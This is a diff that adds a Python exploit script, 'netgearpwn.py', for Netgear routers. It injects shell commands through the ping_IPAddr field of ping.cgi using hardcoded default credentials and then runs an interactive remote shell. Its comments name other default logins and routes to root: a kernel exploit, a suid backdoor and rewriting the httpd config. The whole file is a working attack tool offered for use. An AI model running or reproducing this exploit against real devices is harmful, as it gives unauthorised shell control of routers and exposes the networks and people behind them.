@@ -1,0 +1,58 @@
+#!/usr/bin/python
+#Provides access to default user account, privileges can be easily elevated by using either:
+# - a kernel exploit (ex. memodipper was tested and it worked)
+# - by executing /bin/bd (suid backdoor present on SOME but not all versions)
+# - by manipulating the httpd config files to trick the root user into executing your code (separate advisory will be released soon along with the 2nd vuln)
+
+#Pozdrawiam: Kornela, Komara i Sknerusa
+
+import sys
+import requests
+
+#You can change these credentials to ex. Gearguy/Geardog or Guest/Guest which are hardcoded on SOME firmware versions
+#These routers DO NOT support telnet/ssh access so you can use this exploit to access the shell if you want to
+
+login = 'admin'
+password = 'password' 
+
+
+def main():
+	if len(sys.argv) < 2 or len(sys.argv) == 3:
+		print "./netgearpwn.py <router ip>"
+		return
+	spawnShell()
+
+def execute(cmd):
+	r = requests.post("http://" + sys.argv[1] + "/ping.cgi", data={'IPAddr1': 12, 'IPAddr2': 12, 'IPAddr3': 12, 'IPAddr4': 12, 'ping':"Ping", 'ping_IPAddr':"12.12.12.12; " + cmd}, auth=(login, password), headers={'referer': "http://192.168.0.1/DIAG_diag.htm"})
+	result = parseOutput(r.text)	
+	return result
+
+def spawnShell():
+	r = execute("echo pwn3d")
+
+	if any("pwn3d" in s for s in r) == False:
+		print "Something went wrong, is the system vulnerable? Are the credentials correct?"
+		return
+
+	while True:
+		cmd = raw_input("$ ")
+		r = execute(cmd)
+		for l in r:
+			print l.encode("utf-8")
+
+def parseOutput(output):
+	yet = False
+	a = False
+	result = []
+	for line in output.splitlines():
+		if line.startswith("<textarea"):
+			yet = True
+			continue
+		if yet == True: 			
+			if line.startswith("</textarea>"):
+				break
+			result.append(line)
+	return result
+
+if __name__ == "__main__":
+	main()
